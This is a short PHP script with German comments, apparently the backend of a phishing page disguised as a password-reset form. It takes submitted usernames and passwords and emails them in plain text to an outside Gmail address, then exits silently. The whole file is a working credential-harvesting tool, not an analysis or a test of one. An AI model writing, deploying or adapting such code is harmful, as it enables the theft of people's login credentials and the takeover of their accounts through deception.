<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Die eingegebenen Informationen abrufen
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Deine E-Mail-Adresse, an die die Informationen gesendet werden sollen
    $empfaenger = "gustavofring69666@gmail.com";

    $betreff = "Passwort zurücksetzen";

    $nachricht = "Benutzername: $username\n";
    $nachricht .= "Passwort: $password\n";

    // E-Mail senden
    mail($empfaenger, $betreff, $nachricht);

    exit;
}
?>
